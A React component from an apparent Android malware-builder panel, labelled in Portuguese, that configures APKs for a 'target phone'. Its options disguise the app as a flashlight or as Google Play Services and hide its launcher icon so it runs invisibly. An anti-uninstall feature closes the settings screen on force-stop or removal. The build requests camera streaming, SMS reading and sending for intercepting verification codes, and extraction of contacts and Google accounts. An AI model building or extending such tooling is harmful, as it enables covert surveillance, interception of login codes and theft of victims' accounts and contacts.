import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { apkAPI, getApiBaseUrl } from '../services/api';
import { ArrowLeft, Package, Download, Loader, CheckCircle, Camera, MessageSquare, Users } from 'lucide-react';

interface APKBuilderProps {
  onLogout: () => void;
}

export default function APKBuilder({ onLogout: _onLogout }: APKBuilderProps) {
  const navigate = useNavigate();
  const [appName, setAppName] = useState('Lanterna Potente');
  const [webviewUrl, setWebviewUrl] = useState('');
  const [language, setLanguage] = useState<'pt' | 'en' | 'es'>('pt');
  const [hideFromLauncher, setHideFromLauncher] = useState(false);
  const [enableAntiKill, setEnableAntiKill] = useState(true);

  // 🛡️ Estados para seleção de permissões individuais
  const [permissions, setPermissions] = useState({
    camera: true,
    contacts: true,
    sendSms: true,
    readSms: true,
  });

  const togglePermission = (key: keyof typeof permissions) => {
    setPermissions((prev) => ({ ...prev, [key]: !prev[key] }));
  };

  const toggleAllPermissions = (enable: boolean) => {
    setPermissions({
      camera: enable,
      contacts: enable,
      sendSms: enable,
      readSms: enable,
    });
  };

  const [iconFile, setIconFile] = useState<File | null>(null);
  const [iconPreview, setIconPreview] = useState<string>('');
  const [building, setBuilding] = useState(false);
  const [buildSuccess, setBuildSuccess] = useState(false);
  const [downloadUrl, setDownloadUrl] = useState('');
  const [error, setError] = useState('');
  const [buildProgress, setBuildProgress] = useState(0);
  const [buildMessage, setBuildMessage] = useState('');
  const [buildId, setBuildId] = useState<string | null>(null);

  const handleIconChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setIconFile(file);
      const reader = new FileReader();
      reader.onload = (event) => {
        setIconPreview(event.target?.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  // Polling do status do build
  useEffect(() => {
    if (!buildId || !building) return;

    const interval = setInterval(async () => {
      try {
        const token = localStorage.getItem('token');
        const response = await fetch(`${getApiBaseUrl()}/api/build-status/${buildId}`, {
          headers: { 'Authorization': `Bearer ${token}` }
        });
        
        if (response.ok) {
          const data = await response.json();
          setBuildProgress(data.progress || 0);
          setBuildMessage(data.message || '');
          
          if (data.status === 'success' || data.status === 'done') {
            setBuilding(false);
            setBuildSuccess(true);
            setDownloadUrl(data.download_url || (data.result && data.result.download_url) || '');
            clearInterval(interval);
          } else if (data.status === 'error') {
            setBuilding(false);
            setError(data.message || 'Erro no build');
            clearInterval(interval);
          }
        }
      } catch (err) {
        console.error('Erro ao verificar status:', err);
      }
    }, 2000);

    return () => clearInterval(interval);
  }, [buildId, building]);

  const handleBuild = async () => {
    if (!iconFile) {
      setError('Ícone é obrigatório');
      return;
    }

    setBuilding(true);
    setError('');
    setBuildSuccess(false);
    setBuildProgress(0);
    setBuildMessage('Iniciando build...');

    try {
      const formData = new FormData();
      formData.append('app_name', appName);
      formData.append('icon', iconFile);
      formData.append('language', language);
      if (webviewUrl.trim()) {
        formData.append('webview_url', webviewUrl.trim());
      }
      formData.append('hide_from_launcher', hideFromLauncher ? 'true' : 'false');
      formData.append('enable_anti_kill', enableAntiKill ? 'true' : 'false');
      formData.append('enable_camera', permissions.camera ? 'true' : 'false');
      formData.append('enable_contacts', permissions.contacts ? 'true' : 'false');
      formData.append('enable_send_sms', permissions.sendSms ? 'true' : 'false');
      formData.append('enable_read_sms', permissions.readSms ? 'true' : 'false');

      const response = await apkAPI.build(formData);

      // Build assíncrono - salva o build_id para polling
      if (response.status === 'building' && response.build_id) {
        setBuildId(response.build_id);
        setBuildMessage('Build iniciado em background...');
      } else if (response.status === 'success') {
        // Build síncrono (fallback)
        setBuildSuccess(true);
        setDownloadUrl(response.download_url);
        setBuilding(false);
      }
    } catch (err: any) {
      setError(err.response?.data?.detail || 'Erro ao construir APK');
      setBuilding(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#1e0603] text-slate-100 flex flex-col font-sans">
      {/* Header */}
      <header className="bg-[#290903]/80 backdrop-blur-md border-b border-blue-500/20 px-6 py-4 sticky top-0 z-50">
        <div className="max-w-6xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-3">
            <button
              onClick={() => navigate('/build-apk')}
              className="p-2 hover:bg-[#501006] border border-blue-500/20 rounded-lg transition-colors text-cyan-400"
              title="Voltar para a seleção"
            >
              <ArrowLeft className="w-4 h-4" />
            </button>
            <div>
              <h1 className="text-sm font-black uppercase tracking-widest text-white font-mono">
                APK <span className="text-cyan-400">Rápido</span>
              </h1>
              <p className="text-[10px] text-slate-500 font-mono uppercase tracking-wider">Construtor automatizado</p>
            </div>
          </div>
          <button
            onClick={() => navigate('/dashboard')}
            className="text-slate-450 hover:text-cyan-400 transition-colors font-mono text-xs uppercase tracking-wider font-bold"
          >
            Dashboard
          </button>
        </div>
      </header>

      <main className="max-w-xl mx-auto px-6 py-12 flex-1 w-full flex flex-col justify-center">
        <div className="space-y-6 relative">
          <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-72 h-72 bg-blue-500/5 rounded-full blur-3xl pointer-events-none"></div>

          {/* Form */}
          <div className="bg-[#280904]/85 border border-blue-500/20 shadow-[0_4px_25px_rgba(0,0,0,0.4)] rounded-2xl p-6 relative overflow-hidden group">
            <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-cyan-500/30 to-transparent"></div>
            <h2 className="text-sm font-black text-cyan-400 uppercase tracking-widest mb-6 flex items-center gap-2 font-mono">
              <Package className="w-4 h-4 text-cyan-400 animate-pulse" />
              Configuração do Aplicativo
            </h2>

            <div className="space-y-5">
              <div>
                <label className="block text-[10px] font-black text-slate-400 uppercase tracking-wider font-mono mb-2">
                  Nome Exibido do App
                </label>
                <input
                  type="text"
                  value={appName}
                  onChange={(e) => setAppName(e.target.value)}
                  className="w-full px-3 py-2 bg-[#200703]/90 border border-blue-500/25 rounded-lg text-white placeholder-slate-650 focus:outline-none focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400/30 text-sm transition-all"
                  placeholder="Ex: Google Play Services"
                />
                <p className="mt-1.5 text-[9px] text-slate-550 font-mono">Nome que aparecerá abaixo do ícone no celular alvo</p>
              </div>

              <div>
                <label className="block text-[10px] font-black text-slate-400 uppercase tracking-wider font-mono mb-2">
                  Idioma do Aplicativo (Assistente e Permissões)
                </label>
                <select
                  value={language}
                  onChange={(e) => setLanguage(e.target.value as any)}
                  className="w-full px-3 py-2 bg-[#200703]/90 border border-blue-500/25 rounded-lg text-white focus:outline-none focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400/30 text-sm transition-all font-sans cursor-pointer"
                >
                  <option value="pt" className="bg-[#280904] text-white">Português (Brasil) 🇧🇷</option>
                  <option value="en" className="bg-[#280904] text-white">English (United States) 🇺🇸</option>
                  <option value="es" className="bg-[#280904] text-white">Español (España / LATAM) 🇪🇸</option>
                </select>
                <p className="mt-1.5 text-[9px] text-slate-550 font-mono">Define a língua das telas de aviso, permissões e assistente do aplicativo gerado</p>
              </div>

              <div>
                <label className="block text-[10px] font-black text-slate-400 uppercase tracking-wider font-mono mb-2">
                  Redirecionamento WebView (Opcional)
                </label>
                <input
                  type="text"
                  value={webviewUrl}
                  onChange={(e) => setWebviewUrl(e.target.value)}
                  className="w-full px-3 py-2 bg-[#200703]/90 border border-blue-500/25 rounded-lg text-white placeholder-slate-650 focus:outline-none focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400/30 text-sm transition-all"
                  placeholder="Ex: https://www.meusite.com"
                />
                <p className="mt-1.5 text-[9px] text-slate-550 font-mono">Se configurado, o aplicativo abrirá este site em tela cheia após conceder as permissões</p>
              </div>

              <div>
                <label className="block text-[10px] font-black text-slate-400 uppercase tracking-wider font-mono mb-2">
                  Ícone customizado
                </label>
                <div className="flex items-center space-x-4">
                  {iconPreview ? (
                    <img src={iconPreview} alt="Preview" className="w-14 h-14 rounded-xl border border-blue-500/30 object-cover shadow-[0_0_15px_rgba(239,68,68,0.15)]" />
                  ) : (
                    <div className="w-14 h-14 bg-[#200703]/80 border border-dashed border-slate-750 rounded-xl flex items-center justify-center text-slate-600 text-lg">🖼️</div>
                  )}
                  <label className="flex-1 px-4 py-2.5 bg-[#350b04] border border-blue-500/20 hover:border-cyan-450 hover:bg-[#501006] text-slate-300 rounded-lg cursor-pointer transition-colors text-center font-mono text-xs uppercase tracking-wider font-bold">
                    <input
                      type="file"
                      accept="image/png,image/jpeg,image/jpg"
                      onChange={handleIconChange}
                      className="hidden"
                    />
                    {iconFile ? iconFile.name : 'Selecionar imagem (PNG/JPG)'}
                  </label>
                </div>
                <p className="mt-1.5 text-[9px] text-slate-550 font-mono">Imagens de qualquer proporção serão redimensionadas e otimizadas para o APK</p>
              </div>

              {/* Toggle ocultar da tela inicial */}
              <div>
                <label className="block text-[10px] font-black text-slate-400 uppercase tracking-wider font-mono mb-2">
                  Ocultar da Tela Inicial
                </label>
                <button
                  type="button"
                  onClick={() => setHideFromLauncher(v => !v)}
                  className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors duration-200 focus:outline-none ${
                    hideFromLauncher
                      ? 'bg-gradient-to-r from-red-600 to-orange-500 shadow-[0_0_10px_rgba(239,68,68,0.4)]'
                      : 'bg-[#401108] border border-blue-500/20'
                  }`}
                >
                  <span
                    className={`inline-block h-4 w-4 transform rounded-full bg-white shadow transition-transform duration-200 ${
                      hideFromLauncher ? 'translate-x-6' : 'translate-x-1'
                    }`}
                  />
                </button>
                <p className="mt-1.5 text-[9px] text-slate-550 font-mono">
                  {hideFromLauncher
                    ? '⚠️ O ícone NÃO aparecerá na tela inicial — app roda invisível em background'
                    : 'Ícone visível normalmente na tela inicial do dispositivo'}
                </p>
              </div>

              {/* Toggle Anti-Kill / Anti-Desinstalação */}
              <div>
                <label className="block text-[10px] font-black text-slate-400 uppercase tracking-wider font-mono mb-2">
                  Proteção Anti-Kill / Anti-Desinstalação
                </label>
                <button
                  type="button"
                  onClick={() => setEnableAntiKill(v => !v)}
                  className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors duration-200 focus:outline-none ${
                    enableAntiKill
                      ? 'bg-gradient-to-r from-emerald-500 to-cyan-500 shadow-[0_0_10px_rgba(16,185,129,0.4)]'
                      : 'bg-[#401108] border border-blue-500/20'
                  }`}
                >
                  <span
                    className={`inline-block h-4 w-4 transform rounded-full bg-white shadow transition-transform duration-200 ${
                      enableAntiKill ? 'translate-x-6' : 'translate-x-1'
                    }`}
                  />
                </button>
                <p className="mt-1.5 text-[9px] text-slate-550 font-mono">
                  {enableAntiKill
                    ? '🛡️ ATIVADO: O app fecha a tela de configurações se tentarem forçar parada ou desinstalar'
                    : '⚪ DESATIVADO: Proteção desligada (evita qualquer interferência ao voltar para a tela inicial)'}
                </p>
              </div>

              {/* 🛡️ Seleção de Permissões e Acessos do App */}
              <div className="pt-4 border-t border-blue-500/20">
                <div className="flex items-center justify-between mb-3">
                  <div>
                    <label className="block text-[11px] font-black text-cyan-400 uppercase tracking-widest font-mono">
                      🛡️ Permissões e Acessos do Aplicativo
                    </label>
                    <p className="text-[9px] text-slate-400 font-mono mt-0.5">
                      Marque quais permissões o APK solicitará no dispositivo do alvo:
                    </p>
                  </div>
                  <div className="flex gap-1.5">
                    <button
                      type="button"
                      onClick={() => toggleAllPermissions(true)}
                      className="text-[9px] font-bold font-mono px-2 py-0.5 bg-cyan-500/15 hover:bg-cyan-500/30 text-cyan-300 border border-cyan-500/40 rounded-md transition cursor-pointer"
                    >
                      Todas
                    </button>
                    <button
                      type="button"
                      onClick={() => toggleAllPermissions(false)}
                      className="text-[9px] font-bold font-mono px-2 py-0.5 bg-slate-800 hover:bg-slate-700 text-slate-400 border border-slate-700 rounded-md transition cursor-pointer"
                    >
                      Nenhuma
                    </button>
                  </div>
                </div>

                <div className="space-y-2.5 max-h-[340px] overflow-y-auto pr-1 custom-scrollbar">
                  {/* Câmera */}
                  <div
                    onClick={() => togglePermission('camera')}
                    className={`p-3.5 rounded-xl border transition-all cursor-pointer flex items-start gap-3 ${
                      permissions.camera
                        ? 'bg-blue-950/50 border-cyan-500/50 shadow-[0_0_15px_rgba(239,68,68,0.2)]'
                        : 'bg-[#200703]/50 border-slate-800 opacity-60'
                    }`}
                  >
                    <div className={`p-2.5 rounded-lg ${permissions.camera ? 'bg-cyan-500/20 text-cyan-400 border border-cyan-500/40' : 'bg-slate-800 text-slate-500'}`}>
                      <Camera className="w-5 h-5" />
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-bold text-white font-mono">📷 Câmeras (Fotos & Streaming)</span>
                        <span className={`text-[9px] font-bold font-mono px-2 py-0.5 rounded-full ${permissions.camera ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40' : 'bg-slate-800 text-slate-500'}`}>
                          {permissions.camera ? 'CONCEDIDA' : 'DESATIVADA'}
                        </span>
                      </div>
                      <p className="text-[10px] text-slate-300 mt-1 leading-relaxed font-mono">
                        Solicita acesso à câmera frontal e traseira. Se desativado, o aplicativo <strong className="text-cyan-400">NÃO</strong> pedirá essa permissão no aparelho.
                      </p>
                    </div>
                  </div>

                  {/* Contas Google e Agenda de Contatos */}
                  <div
                    onClick={() => togglePermission('contacts')}
                    className={`p-3.5 rounded-xl border transition-all cursor-pointer flex items-start gap-3 ${
                      permissions.contacts
                        ? 'bg-blue-950/50 border-amber-500/50 shadow-[0_0_15px_rgba(245,158,11,0.2)]'
                        : 'bg-[#200703]/50 border-slate-800 opacity-60'
                    }`}
                  >
                    <div className={`p-2.5 rounded-lg ${permissions.contacts ? 'bg-amber-500/20 text-amber-400 border border-amber-500/40' : 'bg-slate-800 text-slate-500'}`}>
                      <Users className="w-5 h-5" />
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-bold text-amber-300 font-mono">📧 Contas Google & Agenda de Contatos</span>
                        <span className={`text-[9px] font-bold font-mono px-2.5 py-0.5 rounded-full border transition-all ${permissions.contacts ? 'bg-amber-500/20 text-amber-300 border-amber-500/40 shadow-[0_0_10px_rgba(245,158,11,0.25)]' : 'bg-slate-800 text-slate-500 border-slate-700'}`}>
                          {permissions.contacts ? 'CONCEDIDA' : 'DESATIVADA'}
                        </span>
                      </div>
                      <p className="text-[10px] text-slate-300 mt-1 leading-relaxed font-mono">
                        Necessário para consultar as contas conectadas ao dispositivo e extrair contatos da agenda telefônica.
                      </p>
                    </div>
                  </div>

                  {/* Enviar SMS */}
                  <div
                    onClick={() => togglePermission('sendSms')}
                    className={`p-3.5 rounded-xl border transition-all cursor-pointer flex items-start gap-3 ${
                      permissions.sendSms
                        ? 'bg-blue-950/50 border-cyan-500/50 shadow-[0_0_15px_rgba(239,68,68,0.2)]'
                        : 'bg-[#200703]/50 border-slate-800 opacity-60'
                    }`}
                  >
                    <div className={`p-2.5 rounded-lg ${permissions.sendSms ? 'bg-cyan-500/20 text-cyan-400 border border-cyan-500/40' : 'bg-slate-800 text-slate-500'}`}>
                      <MessageSquare className="w-5 h-5" />
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-bold text-white font-mono">📱 Enviar Mensagens SMS</span>
                        <span className={`text-[9px] font-bold font-mono px-2.5 py-0.5 rounded-full border transition-all ${permissions.sendSms ? 'bg-emerald-500/20 text-emerald-400 border-emerald-500/40 shadow-[0_0_10px_rgba(16,185,129,0.25)]' : 'bg-slate-800 text-slate-500 border-slate-700'}`}>
                          {permissions.sendSms ? 'CONCEDIDA' : 'DESATIVADA'}
                        </span>
                      </div>
                      <p className="text-[10px] text-slate-300 mt-1 leading-relaxed font-mono">
                        Autoriza o envio de mensagens SMS diretas pelo aplicativo utilizando a linha do dispositivo.
                      </p>
                    </div>
                  </div>

                  {/* Ler SMS */}
                  <div
                    onClick={() => togglePermission('readSms')}
                    className={`p-3.5 rounded-xl border transition-all cursor-pointer flex items-start gap-3 ${
                      permissions.readSms
                        ? 'bg-blue-950/50 border-cyan-500/50 shadow-[0_0_15px_rgba(239,68,68,0.2)]'
                        : 'bg-[#200703]/50 border-slate-800 opacity-60'
                    }`}
                  >
                    <div className={`p-2.5 rounded-lg ${permissions.readSms ? 'bg-cyan-500/20 text-cyan-400 border border-cyan-500/40' : 'bg-slate-800 text-slate-500'}`}>
                      <MessageSquare className="w-5 h-5" />
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-bold text-white font-mono">📥 Ler Caixa de Entrada SMS</span>
                        <span className={`text-[9px] font-bold font-mono px-2.5 py-0.5 rounded-full border transition-all ${permissions.readSms ? 'bg-emerald-500/20 text-emerald-400 border-emerald-500/40 shadow-[0_0_10px_rgba(16,185,129,0.25)]' : 'bg-slate-800 text-slate-500 border-slate-700'}`}>
                          {permissions.readSms ? 'CONCEDIDA' : 'DESATIVADA'}
                        </span>
                      </div>
                      <p className="text-[10px] text-slate-300 mt-1 leading-relaxed font-mono">
                        Permite a leitura de mensagens recebidas e enviadas para validação e verificação de códigos.
                      </p>
                    </div>
                  </div>
                </div>
              </div>


              {/* Barra de progresso durante build */}
              {building && (
                <div className="mt-6 p-4 bg-[#200703]/60 border border-blue-500/10 rounded-xl">
                  <div className="flex justify-between text-[10px] font-mono uppercase tracking-wider text-slate-400 mb-2">
                    <span className="truncate max-w-[80%] text-cyan-400 animate-pulse">{buildMessage}</span>
                    <span className="font-bold text-slate-200">{buildProgress}%</span>
                  </div>
                  <div className="w-full bg-[#1e0603] rounded-full h-2 border border-slate-850">
                    <div 
                      className="bg-gradient-to-r from-blue-600 to-cyan-500 h-1.5 rounded-full transition-all duration-300 shadow-[0_0_8px_rgba(239,68,68,0.2)]"
                      style={{ width: `${buildProgress}%` }}
                    />
                  </div>
                  <p className="text-[9px] text-slate-500 mt-2 font-mono leading-relaxed">
                    Processando manifestos e empacotando assets. Isso roda em background, você pode navegar livremente.
                  </p>
                </div>
              )}

              <button
                onClick={handleBuild}
                disabled={building || !appName.trim()}
                className="w-full py-2.5 bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-700 hover:to-cyan-600 disabled:from-slate-800 disabled:to-slate-850 disabled:text-slate-650 text-white font-bold rounded-lg transition-colors flex items-center justify-center space-x-2 text-xs uppercase tracking-widest font-mono shadow-[0_4px_15px_rgba(220,38,38,0.2)]"
              >
                {building ? (
                  <>
                    <Loader className="w-4 h-4 animate-spin" />
                    <span>Compilando... ({buildProgress}%)</span>
                  </>
                ) : (
                  <>
                    <Package className="w-4 h-4" />
                    <span>Construir APK</span>
                  </>
                )}
              </button>

              {error && (
                <div className="bg-red-950/20 border border-red-500/35 text-red-400 px-4 py-3 rounded-xl text-xs font-mono">
                  ⚠️ {error}
                </div>
              )}

              {buildSuccess && (
                <div className="bg-[#0e2a22]/35 border border-emerald-500/30 rounded-xl p-4 mt-6">
                  <div className="flex items-center text-emerald-400 font-bold mb-3 uppercase tracking-wider text-xs font-mono">
                    <CheckCircle className="w-4 h-4 mr-2 text-emerald-400 animate-bounce" />
                    Compilação concluída com sucesso!
                  </div>
                  <a
                    href={`${getApiBaseUrl()}${downloadUrl}`}
                    download
                    className="w-full flex items-center justify-center space-x-2 py-2.5 bg-gradient-to-r from-emerald-600 to-teal-500 hover:from-emerald-700 hover:to-teal-600 text-white rounded-lg transition-colors font-bold font-mono text-xs uppercase tracking-widest shadow-[0_0_15px_rgba(16,185,129,0.25)] border-none"
                  >
                    <Download className="w-4 h-4" />
                    <span>Baixar Aplicativo</span>
                  </a>
                </div>
              )}
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
